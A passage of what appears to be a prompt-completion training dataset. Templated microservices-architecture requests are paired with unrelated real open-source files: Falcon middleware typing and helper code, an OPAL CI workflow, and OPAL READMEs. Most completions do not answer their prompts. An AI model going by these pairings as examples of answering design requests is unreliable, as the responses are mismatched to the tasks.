AsgiRequest,\n        resp: AsgiResponse,\n        resource: object,\n        req_succeeded: bool,\n    ) -> None: ...\n\n\n# NOTE(jkmnt): This typing is far from perfect due to the Python typing limitations,\n# but better than nothing. Middleware conforming to any protocol of the union\n# will pass the type check. Other protocols violations are not checked.\nSyncMiddleware = Union[\n    WsgiMiddlewareWithProcessRequest,\n    WsgiMiddlewareWithProcessResource,\n    WsgiMiddlewareWithProcessResponse,\n]\n\"\"\"Synchronous (WSGI) application middleware.\n\nThis type alias reflects the middleware interface for\ncomponents that can be used with a WSGI app.\n\"\"\"\n\nAsyncMiddleware = Union[\n    AsgiMiddlewareWithProcessRequest,\n    AsgiMiddlewareWithProcessResource,\n    AsgiMiddlewareWithProcessResponse,\n    # Lifespan middleware\n    AsgiMiddlewareWithProcessStartup,\n    AsgiMiddlewareWithProcessShutdown,\n    # WebSocket middleware\n    AsgiMiddlewareWithProcessRequestWs,\n    AsgiMiddlewareWithProcessResourceWs,\n    # Universal middleware with process_*_async methods\n    UniversalMiddlewareWithProcessRequest,\n    UniversalMiddlewareWithProcessResource,\n    UniversalMiddlewareWithProcessResponse,\n]\n\"\"\"Asynchronous (ASGI) application middleware.\n\nThis type alias reflects the middleware interface for components that can be\nused with an ASGI app.\n\"\"\"\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "falcon/_typing.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.85, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 368}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright 2013 by Rackspace Hosting, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#    http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Utilities for the App class.\"\"\"\n\nfrom __future__ import annotations\n\nfrom inspect import iscoroutinefunction\nfrom typing import IO, Iterable, List, Literal, Optional, overload, Tuple, Union\n\nfrom falcon import util\nfrom falcon._typing import AsgiProcessRequestMethod as APRequest\nfrom falcon._typing import AsgiProcessRequestWsMethod\nfrom falcon._typing import AsgiProcessResourceMethod as APResource\nfrom falcon._typing import AsgiProcessResourceWsMethod\nfrom falcon._typing import AsgiProcessResponseMethod as APResponse\nfrom falcon._typing import AsyncMiddleware\nfrom falcon._typing import ProcessRequestMethod as PRequest\nfrom falcon._typing import ProcessResourceMethod as PResource\nfrom falcon._typing import ProcessResponseMethod as PResponse\nfrom falcon._typing import SyncMiddleware\nfrom falcon.constants import MEDIA_JSON\nfrom falcon.constants import MEDIA_XML\nfrom falcon.errors import CompatibilityError\nfrom falcon.errors import HTTPError\nfrom falcon.request import Request\nfrom falcon.response import Response\nfrom falcon.util.sync import _wrap_non_coroutine_unsafe\n\n__all__ = (\n    'prepare_middleware',\n    'prepare_middleware_ws',\n    'default_serialize_error',\n    'CloseableStreamIterator',\n)\n\nPreparedMiddlewareResult = Tuple[\n    Union[\n        Tuple[PRequest, ...], Tuple[Tuple[Optional[PRequest], Optional[PResource]], ...]\n    ],\n    Tuple[PResource, ...],\n    Tuple[PResponse, ...],\n]\nAsyncPreparedMiddlewareResult = Tuple[\n    Union[\n        Tuple[APRequest, ...],\n        Tuple[Tuple[Optional[APRequest], Optional[APResource]], ...],\n    ],\n    Tuple[APResource, ...],\n    Tuple[APResponse, ...],\n]\n\n\n@overload\ndef prepare_middleware(\n    middleware: Iterable[SyncMiddleware],\n    independent_middleware: bool = ...,\n    asgi: Literal[False] = ...,\n) -> PreparedMiddlewareResult: ...\n\n\n@overload\ndef prepare_middleware(\n    middleware: Iterable[AsyncMiddleware],\n    independent_middleware: bool = ...,\n    *,\n    asgi: Literal[True],\n) -> AsyncPreparedMiddlewareResult: ...\n\n\n@overload\ndef prepare_middleware(\n    middleware: Union[Iterable[SyncMiddleware], Iterable[AsyncMiddleware]],\n    independent_middleware: bool = ...,\n    asgi: bool = ...,\n) -> Union[PreparedMiddlewareResult, AsyncPreparedMiddlewareResult]: ...\n\n\ndef prepare_middleware(\n    middleware: Union[Iterable[SyncMiddleware], Iterable[AsyncMiddleware]],\n    independent_middleware: bool = False,\n    asgi: bool = False,\n) -> Union[PreparedMiddlewareResult, AsyncPreparedMiddlewareResult]:\n    \"\"\"Check middleware interfaces and prepare the methods for request handling.\n\n    Note:\n        This method is only applicable to WSGI apps.\n\n    Arguments:\n        middleware (iterable): An iterable of middleware objects.\n\n    Keyword Args:\n        independent_middleware (bool): ``True`` if the request and\n            response middleware methods should be treated independently\n            (default ``False``)\n        asgi (bool): ``True`` if an ASGI app, ``False`` otherwise\n            (default ``False``)\n\n    Returns:\n        tuple: A tuple of prepared middleware method tuples\n    \"\"\"\n\n    # PERF(kgriffs): do getattr calls once, in advance, so we don't\n    # have to do them every time in the request path.\n    request_mw: Union[\n        List[PRequest],\n        List[Tuple[Optional[PRequest], Optional[PResource]]],\n        List[APRequest],\n        List[Tuple[Optional[APRequest], Optional[APResource]]],\n    ] = []\n    resource_mw: Union[List[APResource], List[PResource]] = []\n    response_mw: Union[List[APResponse], List[PResponse]] = []\n\n    for component in middleware:\n        # NOTE(kgriffs): Middleware that supports both WSGI and ASGI can\n        #   append an *_async postfix to the ASGI version of the method\n        #   to distinguish the two. Otherwise, the prefix is unnecessary.\n\n        if asgi:\n            process_request: Union[Optional[APRequest], Optional[PRequest]] = (\n                util.get_bound_method(component, 'process_request_async')\n                or _wrap_non_coroutine_unsafe(\n                    util.get_bound_method(component, 'process_request')\n                )\n            )\n\n            process_resource: Union[Optional[APResource], Optional[PResource]] = (\n                util.get_bound_method(component, 'process_resource_async')\n                or _wrap_non_coroutine_unsafe(\n                    util.get_bound_method(component, 'process_resource')\n                )\n            )\n\n            process_response: Union[Optional[APResponse], Optional[PResponse]] = (\n                util.get_bound_method(component, 'process_response_async')\n                or _wrap_non_coroutine_unsafe(\n                    util.get_bound_method(component, 'process_response')\n                )\n            )\n\n            for m in (process_request, process_resource, process_response):\n                # NOTE(kgriffs): iscoroutinefunction() always returns False\n                #   for cythonized functions.\n                #\n                #   https://github.com/cython/cython/issues/2273\n                #   https://bugs.python.org/issue38225\n                #\n                if m and not iscoroutinefunction(m) and util.is_python_func(m):\n                    msg = (\n                        '{} must be implemented as an awaitable coroutine. If '\n                        'you would like to retain compatibility '\n                        'with WSGI apps, the coroutine versions of the '\n                        'middleware methods may be implemented side-by-side '\n                        'by applying an *_async postfix to the method names. '\n                    )\n                    raise CompatibilityError(msg.format(m))\n\n        else:\n            process_request = util.get_bound_method(component, 'process_request')\n            process_resource = util.get_bound_method(component, 'process_resource')\n            process_response = util.get_bound_method(component, 'process_response')\n\n            for m in (process_request, process_resource, process_response):\n                if m and iscoroutinefunction(m):\n                    msg = (\n                        '{} may not implement coroutine methods and '\n                        'remain compatible with WSGI apps without '\n                        'using the *_async postfix to explicitly identify '\n                        'the coroutine version of a given middleware '\n                        'method.'\n                    )\n                    raise CompatibilityError(msg.format(component))\n\n        if not (process_request or process_resource or process_response):\n            if asgi and any(\n                hasattr(component, m)\n                for m in [\n                    'process_startup',\n                    'process_shutdown',\n                    'process_request_ws',\n                    'process_resource_ws',\n                ]\n            ):\n                # NOTE(kgriffs): This middleware only has ASGI lifespan\n                #   event handlers\n                continue\n\n            msg = '{0} must implement at least one middleware method'\n            raise TypeError(msg.format(component))\n\n        # NOTE: depending on whether we want to execute middleware\n        # independently, we group response and request middleware either\n        # together or separately.\n        if independent_middleware:\n            if process_request:\n                request_mw.append(process_request)  # type: ignore[arg-type]\n            if process_response:\n                response_mw.insert(0, process_response)  # type: ignore[arg-type]\n        else:\n            if process_request or process_response:\n                request_mw.append((process_request, process_response))  # type: ignore[arg-type]\n\n        if process_resource:\n            resource_mw.append(process_resource)  # type: ignore[arg-type]\n\n    return tuple(request_mw), tuple(resource_mw), tuple(response_mw)  # type: ignore[return-value]\n\n\nAsyncPreparedMiddlewareWsResult = Tuple[\n    Tuple[AsgiProcessRequestWsMethod, ...], Tuple[AsgiProcessResourceWsMethod, ...]\n]\n\n\ndef prepare_middleware_ws(\n    middleware: Iterable[AsyncMiddleware],\n) -> AsyncPreparedMiddlewareWsResult:\n    \"\"\"Check middleware interfaces and prepare WebSocket methods for request handling.\n\n    Note:\n        This method is only applicable to ASGI apps.\n\n    Arguments:\n        middleware (iterable): An iterable of middleware objects.\n\n    Returns:\n        tuple: A two-item ``(request_mw, resource_mw)`` tuple, where\n        *request_mw* is an ordered list of ``process_request_ws()`` methods,\n        and *resource_mw* is an ordered list of ``process_resource_ws()``\n        methods.\n    \"\"\"\n\n    # PERF(kgriffs): do getattr calls once, in advance, so we don't\n    # have to do them every time in the request path.\n    request_mw: List[AsgiProcessRequestWsMethod] = []\n    resource_mw: List[AsgiProcessResourceWsMethod] = []\n\n    process_request_ws: Optional[AsgiProcessRequestWsMethod]\n    process_resource_ws: Optional[AsgiProcessResourceWsMethod]\n\n    for component in middleware:\n        process_request_ws = util.get_bound_method(component, 'process_request_ws')\n        process_resource_ws = util.get_bound_method(component, 'process_resource_ws')\n\n        for m in (process_request_ws, process_resource_ws):\n            if not m:\n                continue\n\n            # NOTE(kgriffs): iscoroutinefunction() always returns False\n            #   for cythonized functions.\n            #\n            #   https://github.com/cython/cython/issues/2273\n            #   https://bugs.python.org/issue38225\n            #\n            if not iscoroutinefunction(m) and util.is_python_func(m):\n                msg = '{} must be implemented as an awaitable coroutine.'\n                raise CompatibilityError(msg.format(m))\n\n        if process_request_ws:\n            request_mw.append(process_request_ws)\n\n        if process_resource_ws:\n            resource_mw.append(process_resource_ws)\n\n    return tuple(request_mw), tuple(resource_mw)\n\n\ndef default_serialize_error(req: Request, resp: Response, exception: HTTPError) -> None:\n    \"\"\"Serialize the given instance of HTTPError.\n\n    This function determines which of the supported media types, if\n    any, are acceptable by the client, and serializes the error\n    to the preferred type.\n\n    Currently, JSON and XML are the only supported media types. If the\n    client accepts both JSON and XML with equal weight, JSON will be\n    chosen.\n\n    Other media types can be supported by using a custom error serializer.\n\n    Note:\n        If a custom media type is used and the type includes a\n        \"+json\" or \"+xml\" suffix, the error will be serialized\n        to JSON or XML, respectively. If this behavior is not\n        desirable, a custom error serializer may be used to\n        override this one.\n\n    Args:\n        req: Instance of ``falcon.Request``\n        resp: Instance of ``falcon.Response``\n        exception: Instance of ``falcon.HTTPError``\n    \"\"\"\n    options = resp.options\n    predefined = (\n        [MEDIA_JSON, 'text/xml', MEDIA_XML]\n        if options.xml_error_serialization\n        else [MEDIA_JSON]\n    )\n    media_handlers = [mt for mt in options.media_handlers if mt not in predefined]\n    # NOTE(caselit,vytas): Add the registered handlers after the predefined\n    #   ones. This ensures that in the case of an equal match, the first one\n    #   (JSON) is selected and that the q parameter is taken into consideration\n    #   when selecting the media handler.\n    preferred = req.client_prefers(predefined + media_handlers)\n\n    if preferred is None:\n        # NOTE(kgriffs): See if the client expects a custom media\n        # type based on something Falcon supports. Returning something\n        # is probably better than nothing, but if that is not\n        # desired, this behavior can be customized by adding a\n        # custom HTTPError serializer for the custom type.\n        accept = req.accept.lower()\n\n        # NOTE(kgriffs): Simple heuristic, but it's fast, and\n        # should be sufficiently accurate for our purposes. Does\n        # not take into account weights if both types are\n        # acceptable (simply chooses JSON). If it turns out we\n        # need to be more sophisticated, we can always change it\n        # later (YAGNI).\n        if '+json' in accept:\n            preferred = MEDIA_JSON\n        elif '+xml' in accept:\n            # NOTE(caselit): Ignore xml_error_serialization when\n            #   checking if the media should be XML. This gives a chance to\n            #   an XML media handler, if any, to be used.\n            preferred = MEDIA_XML\n\n    if preferred is not None:\n        handler, _, _ = options.media_handlers._resolve(\n            preferred, MEDIA_JSON, raise_not_found=False\n        )\n        if preferred == MEDIA_JSON:\n            # NOTE(caselit): Special case JSON to ensure that it's always\n            #   possible to serialize an error in JSON even if no JSON handler\n            #   is set in the media_handlers.\n            resp.data = exception.to_json(handler)\n        elif handler:\n            # NOTE(caselit): Let the app serialize the response even if it\n            #   needs to re-get the handler, since async handlers may not have\n            #   a sync version available.\n            resp.media = exception.to_dict()\n        elif options.xml_error_serialization:\n            resp.data = exception._to_xml()\n\n        # NOTE(kgriffs): No need to append the charset param, since\n        #   utf-8 is the default for both JSON and XML.\n        resp.content_type = preferred\n\n    resp.append_header('Vary', 'Accept')\n\n\nclass CloseableStreamIterator:\n    \"\"\"Iterator that wraps a file-like stream with support for close().\n\n    This iterator can be used to read from an underlying file-like stream\n    in block_size-chunks until the response from the stream is an empty\n    byte string.\n\n    This class is used to wrap WSGI response streams when a\n    wsgi_file_wrapper is not provided by the server.  The fact that it\n    also supports closing the underlying stream allows use of (e.g.)\n    Python tempfile resources that would be deleted upon close.\n\n    Args:\n        stream (object): Readable file-like stream object.\n        block_size (int): Number of bytes to read per iteration.\n    \"\"\"\n\n    def __init__(self, stream: IO[bytes], block_size: int) -> None:\n        self._stream = stream\n        self._block_size = block_size\n\n    def __iter__(self) -> CloseableStreamIterator:\n        return self\n\n    def __next__(self) -> bytes:\n        data = self._stream.read(self._block_size)\n\n        if data == b'':\n            raise StopIteration\n        else:\n            return data\n\n    def close(self) -> None:\n        try:\n            self._stream.close()\n        except (AttributeError, TypeError):\n            pass\n", "metadata": {"source": "github.com/falconry/falcon", "file_path": "falcon/app_helpers.py", "language": "python", "complexity": "complex", "star_count": 9692, "quality_score": 0.8799999999999999, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 399}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# This workflow will install Python dependencies, run tests and lint with a variety of Python versions\n# For more information see: https://help.github.com/actions/language-and-framework-guides/using-python-with-github-actions\n\nname: Tests\n\non:\n  push:\n    branches: [ master ]\n  pull_request:\n    branches: [ master ]\n\n  # Allows you to run this workflow manually from the Actions tab\n  workflow_dispatch:\n\njobs:\n  build:\n    services:\n      redis:\n        image: redis\n        ports:\n          - 6379:6379\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n    runs-on: ubuntu-latest\n    timeout-minutes: 60\n    strategy:\n      matrix:\n        python-version: [\"3.9\", \"3.10\", \"3.11\", \"3.12\"]\n\n    steps:\n    - uses: actions/checkout@v2\n    - name: Set up Python ${{ matrix.python-version }}\n      uses: actions/setup-python@v2\n      with:\n        python-version: ${{ matrix.python-version }}\n    - name: Install dependencies\n      run: |\n        python -m pip install --upgrade pip\n        python -m pip install flake8\n        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi\n        if [ -f ./tests/requirements.txt ]; then pip install -r ./tests/requirements.txt; fi\n    - name: Lint with flake8\n      run: |\n        # stop the build if there are Python syntax errors or undefined names\n        flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics\n        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide\n        flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics\n    - name: Test with pytest\n      run: |\n        pytest\n\n  e2e-tests:\n    runs-on: ubuntu-latest\n    timeout-minutes: 60\n    name: E2E Tests\n    steps:\n      # BUILD PHASE\n      - name: Checkout\n        uses: actions/checkout@v2\n        with:\n          fetch-depth: 0\n\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v1\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v1\n\n      - name: Docker Compose install\n        run: |\n          curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose\n          chmod +x /usr/local/bin/docker-compose\n\n      - name: Build client\n        id: build_client\n        uses: docker/build-push-action@v2\n        with:\n          file: docker/Dockerfile\n          push: false\n          target: client\n          cache-from: type=registry,ref=permitio/opal-client:latest\n          cache-to: type=inline\n          load: true\n          tags: |\n            permitio/opal-client:test\n\n      - name: Build server\n        id: build_server\n        uses: docker/build-push-action@v2\n        with:\n          file: docker/Dockerfile\n          push: false\n          target: server\n          cache-from: type=registry,ref=permitio/opal-server:latest\n          cache-to: type=inline\n          load: true\n          tags: |\n            permitio/opal-server:test\n\n      - name: Set up Python\n        uses: actions/setup-python@v2\n        with:\n          python-version: \"3.10\"\n\n      - name: Install opal packages\n        run: |\n          python -m pip install -e ./packages/opal-common\n          python -m pip install -e ./packages/opal-client\n          python -m pip install -e ./packages/opal-server\n\n      - name: App Tests\n        working-directory: ./app-tests\n        env:\n          OPAL_IMAGE_TAG: test\n          OPAL_TESTS_POLICY_REPO_DEPLOY_KEY: ${{ secrets.OPAL_TESTS_POLICY_REPO_DEPLOY_KEY }}\n        run: |\n          # Prepare git for using tests policy repo\n          export OPAL_POLICY_REPO_SSH_KEY_PATH=$(realpath .)/opal-tests-policy-repo-key\n          echo \"$OPAL_TESTS_POLICY_REPO_DEPLOY_KEY\" > $OPAL_POLICY_REPO_SSH_KEY_PATH\n          chmod 400 $OPAL_POLICY_REPO_SSH_KEY_PATH\n\n          git config --global core.sshCommand \"ssh -i $OPAL_POLICY_REPO_SSH_KEY_PATH -o IdentitiesOnly=yes\"\n          git config --global user.name \"$GITHUB_ACTOR\"\n          git config --global user.email \"<>\"\n\n          ./run.sh\n", "metadata": {"source": "github.com/permitio/opal", "file_path": ".github/workflows/tests.yml", "language": "yaml", "complexity": "medium", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 130}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<p  align=\"center\">\n <img src=\"https://github.com/permitio/opal/assets/4082578/4e21f85f-30ab-43e2-92de-b82f78888c71\" height=170 alt=\"opal\" border=\"0\" />\n</p>\n<h1 align=\"center\">\n⚡OPAL⚡\n</h1>\n\n<h2 align=\"center\">\nOpen Policy Administration Layer\n</h2>\n\n<a href=\"https://github.com/permitio/opal/actions?query=workflow%3ATests\" target=\"_blank\">\n    <img src=\"https://github.com/permitio/opal/workflows/Tests/badge.svg\" alt=\"Tests\">\n</a>\n<a href=\"https://pypi.org/project/opal-server/\" target=\"_blank\">\n    <img src=\"https://img.shields.io/pypi/v/opal-server?color=%2331C654&label=OPAL%20Server%20%28PyPi%29\" alt=\"Package\">\n</a>\n<a href=\"https://pypi.org/project/opal-client/\" target=\"_blank\">\n    <img src=\"https://img.shields.io/pypi/v/opal-client?color=%2331C654&label=OPAL%20Client%20%28PyPi%29\" alt=\"Package\">\n</a>\n<a href=\"https://pepy.tech/project/opal-server\" target=\"_blank\">\n    <img src=\"https://static.pepy.tech/personalized-badge/opal-client?period=total&units=international_system&left_color=black&right_color=blue&left_text=Downloads\" alt=\"Downloads\">\n</a>\n\n<a href=\"https://hub.docker.com/r/permitio/opal-server\" target=\"_blank\">\n    <img src=\"https://img.shields.io/docker/pulls/permitio/opal-client?label=Docker%20pulls\" alt=\"Docker pulls\">\n</a>\n\n<a href=\"https://bit.ly/permit-slack\" target=\"_blank\">\n    <img src=\"https://img.shields.io/badge/Slack%20Community-4A154B?logo=slack&logoColor=white\" alt=\"Join our Slack!\">\n</a>\n<a href=\"https://twitter.com/intent/follow?original_referer=https%3A%2F%2Fpublish.twitter.com%2F%3FbuttonType%3DFollowButton%26query%3Dhttps%253A%252F%252Ftwitter.com%252Fpermit_io%26widget%3DButton&ref_src=twsrc%5Etfw&region=follow_link&screen_name=permit_io&tw_p=followbutton\"><img src=\"https://img.shields.io/twitter/follow/permit_io?label=Follow%20%40permit_io&style=social\">\n</a>\n\n## What is OPAL?\n\nOPAL is an administration layer for Policy Engines such as <a target=\"_blank\" href=\"https://www.openpolicyagent.org/\">Open Policy Agent (OPA)</a>, and <a target=\"_blank\" href=\"https://github.com/permitio/cedar-agent\">AWS' Cedar Agent</a> detecting changes to both policy and policy data in realtime and pushing live updates to your agents. OPAL brings open-policy up to the speed needed by live applications.\n\nAs your app's data state changes (whether it's via your APIs, DBs, git, S3 or 3rd-party SaaS services), OPAL will make sure your services are always in sync with the authorization data and policy they need (and only those they need).\n\nCheck out OPAL's main site at <a target=\"_blank\" href=\"https://opal.ac\">OPAL.ac</a>\n\n## OPAL Use Cases\n\nOPAL is the easiest way to keep your solution's authorization layer up-to-date in realtime. It aggregates policy and data from across the field and integrates them seamlessly into the authorization layer, and is microservices and cloud-native.\n\nHere are some of the main use cases for using OPAL:\n* **End-to-End [Fine-Grained Authorization](https://www.permit.io/blog/what-is-fine-grained-authorization-fga) service** that can be used with any policy language or data store\n* [Google-Zanzibar](https://www.permit.io/blog/what-is-google-zanzibar) support for Policy as Code engines such as OPA and AWS Cedar\n* Streamline permissions in microservice architectures using [centralized policy configuration with decentralized data](https://www.permit.io/blog/best-practices-for-implementing-hybrid-cloud-security) sources and policy engines\n* Manage and automate the deployment of multiple Open Policy Agent engines in a Cloud-Native environment\n\n<img src=\"https://github.com/permitio/opal/assets/4082578/99d3dd95-a7ff-45c2-805e-3d533f8b1e8c\" alt=\"simplified\" border=\"0\">\n\nOPAL  uses a client-server stateless architecture. OPAL-Servers publish policy and data updates over a lightweight (websocket) PubSub Channel, which OPAL-clients subscribe to via topics. Upon updates, each client fetches data directly (from the source) to load it into its managed Policy Engine instance.\n\n\n### OPA + OPAL == 💜\n\nWhile OPA (Open Policy Agent) decouples policy from code in a highly-performant and elegant way, the challenge of keeping policy agents up-to-date remains.\nThis is especially true in applications, where each user interaction or API call may affect access-control decisions.\nOPAL runs in the background, supercharging policy agents and keeping them in sync with events in real time.\n\n### AWS Cedar + OPAL == 💪\n\nCedar is a very powerful policy language, which powers AWS' AVP (Amazon Verified Permissions) - but what if you want to enjoy the power of Cedar on another cloud, locally, or on premise?\nThis is where [Cedar-Agent](https://github.com/permitio/cedar-agent) and OPAL come in.\n\nThis [video](https://youtu.be/tG8jrdcc7Zo) briefly explains OPAL and how it works with OPA, and a deeper dive into it at [this OWASP DevSlop talk](https://www.youtube.com/watch?v=1_Iz0tRQCH4).\n\n## Who's Using OPAL?\nOPAL is being used as the core engine of Permit.io Authorization Service and serves in production:\n* \\> 10,000 policy engines deployment\n* \\> 100,000 policy changes and data synchronizations every day\n* \\> 10,000,000 authorization checks every day\n\nBesides Permit, OPAL is being used in Production in **Tesla**, **Walmart**, **The NBA**, **Intel**, **Cisco**, **Live-Oak Bank**, and thousands of other development teams and companies of all sizes.\n\n## Documentation\n\n- 📃 &nbsp; [Full documentation is available here](https://docs.opal.ac)\n- 💡 &nbsp; [Intro to OPAL](https://docs.opal.ac/getting-started/intro)\n- 🚀 &nbsp; Getting Started:\n\n  OPAL is available both as **python packages** with a built-in CLI as well as pre-built **docker images** ready-to-go.\n\n  - [Play with a live playground environment in docker-compose](https://docs.opal.ac/getting-started/quickstart/opal-playground/overview)\n  <!-- - this tutorial is great for learning about OPAL core features and see what OPAL can do for you. -->\n  - [Try the getting started guide for containers](https://docs.opal.ac/getting-started/running-opal/overview)\n  <!-- - this tutorial will show you how to configure OPAL to your specific needs and run the official docker containers locally or in production. -->\n\n  - [Check out the Helm Chart for Kubernetes](https://github.com/permitio/opal-helm-chart)\n\n- A video demo of OPAL is available [here](https://www.youtube.com/watch?v=IkR6EGY3QfM)\n\n- You can also check out this webinar and Q&A about OPAL [on our YouTube channel](https://www.youtube.com/watch?v=A5adHlkmdC0&t=1s)\n  <br>\n\n- 💪 &nbsp; TL;DR - This one command will download and run a working configuration of OPAL server and OPAL client on your machine:\n\n```\ncurl -L https://raw.githubusercontent.com/permitio/opal/master/docker/docker-compose-example.yml \\\n> docker-compose.yml && docker compose up\n```\n\n<p>\n  <a href=\"https://asciinema.org/a/409288\" target=\"_blank\">\n    <img src=\"https://asciinema.org/a/409288.svg\" />\n  </a>\n</p>\n\n- 🧠 &nbsp; \"How-To\"s\n\n  - [How to get started with OPAL (Packages and CLI)](https://docs.opal.ac/getting-started/running-opal/as-python-package/overview)\n\n  - [How to get started with OPAL (Container Images)](https://docs.opal.ac/getting-started/running-opal/overview)\n\n  - [How to trigger Data Updates via OPAL](https://docs.opal.ac/tutorials/trigger_data_updates)\n\n  - [How to extend OPAL to fetch data from your sources with FetchProviders](https://docs.opal.ac/tutorials/write_your_own_fetch_provider)\n\n  - [How to configure OPAL (basic concepts)](https://docs.opal.ac/tutorials/configure_opal)\n\n  - [How to Use OPAL with Cedar in a Multi-Language Project](https://www.permit.io/blog/scaling-authorization-with-cedar-and-opal)\n\n- 🎨 &nbsp; [Key concepts and design](https://docs.opal.ac/overview/design)\n- 🏗️ &nbsp; [Architecture](https://docs.opal.ac/overview/architecture)\n<br>\n\n📖 For further reading, check out our [Blog](https://io.permit.io/opal-readme-blog)\n\n## Community\n\n We would love to chat with you about OPAL. [Join our Slack community](https://io.permit.io/opal-readme-slack) to chat about authorization, open-source, realtime communication, tech, or anything else!\n\nYou can raise questions and ask for features to be added to the road-map in our [**Github discussions**](https://github.com/permitio/opal/discussions), report issues in [**Github issues**](https://github.com/permitio/opal/issues)\n</br>\n</br>\nIf you like our project, please consider giving us a ⭐️\n</br>\n\n[![Button][join-slack-link]][badge-slack-link] </br> [![Button][follow-twitter-link]][badge-twitter-link]\n\n## Contributing to OPAL\n\nWe would love for you to contribute to this project and help make it even better than it is today! 💎\n\nAs a contributor, here are the guidelines we would like you to follow:\n - [Code of Conduct](CODE_OF_CONDUCT.md)\n - [Question or Problem?](CONTRIBUTING.md#question)\n - [Issues and Bugs](CONTRIBUTING.md#issue)\n - [Feature Requests](CONTRIBUTING.md#feature)\n - [Development Guidelines](CONTRIBUTING.md#development)\n\n[join-slack-link]: https://i.ibb.co/wzrGHQL/Group-749.png\n[badge-slack-link]: https://io.permit.io/join_community\n[follow-twitter-link]: https://i.ibb.co/k4x55Lr/Group-750.png\n[badge-twitter-link]: https://twitter.com/opal_ac\n\n## There's more!\n\n- Check out [OPToggles](https://github.com/permitio/OPToggles), which enables you to create user targeted feature flags/toggles based on Open Policy managed authorization rules!\n- Check out [Cedar-Agent](https://github.com/permitio/cedar-agent), the easiest way to deploy & run AWS Cedar.\n", "metadata": {"source": "github.com/permitio/opal", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 5318, "quality_score": 0.76, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 164}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# OPAL E2E Tests\n\nThis directory contains end-to-end tests for OPAL using a local Gitea git server instead of relying on external services like GitHub.\n\n## Overview\n\nThe tests spin up a complete OPAL environment including:\n- A local Gitea git server to host the policy repository\n- Multiple OPAL server instances (2 replicas)\n- Multiple OPAL client instances (2 replicas)\n- A PostgreSQL database for broadcast communication\n- Policy files loaded from `opal-tests-policy-repo-main/`\n\n## Prerequisites\n\n- Docker and Docker Compose\n- Bash shell\n- Basic Unix tools (curl, git, openssl, ssh-keygen)\n\n## Running the Tests\n\nSimply run:\n```bash\n./run.sh\n```\n\nThe script will:\n1. Generate authentication keys and tokens\n2. Start a local Gitea server\n3. Create a test repository with initial policy files\n4. Start OPAL servers and clients\n5. Run various tests including:\n   - Policy updates via git push\n   - Data updates via API\n   - Statistics verification\n   - Broadcast channel disconnection handling\n\n## Test Policy Files\n\nThe test policies are stored in `opal-tests-policy-repo-main/` and include:\n- `rbac.rego` - Role-based access control policies\n- `utils.rego` - Utility functions\n- `policy.cedar` - Cedar policy examples\n- `data.json` - Initial data\n- `.manifest` - Repository manifest\n\n## Troubleshooting\n\nIf tests fail:\n1. Check Docker logs: `docker compose -f docker-compose-app-tests.yml logs`\n2. Ensure ports 3000, 7002-7003, 7766-7767, 8181-8182 are available\n3. Clean up and retry: `docker compose -f docker-compose-app-tests.yml down -v`\n\nThe script automatically retries up to 5 times to handle transient failures.\n\n## Cleanup\n\nThe script automatically cleans up all resources on exit. Manual cleanup:\n```bash\ndocker compose -f 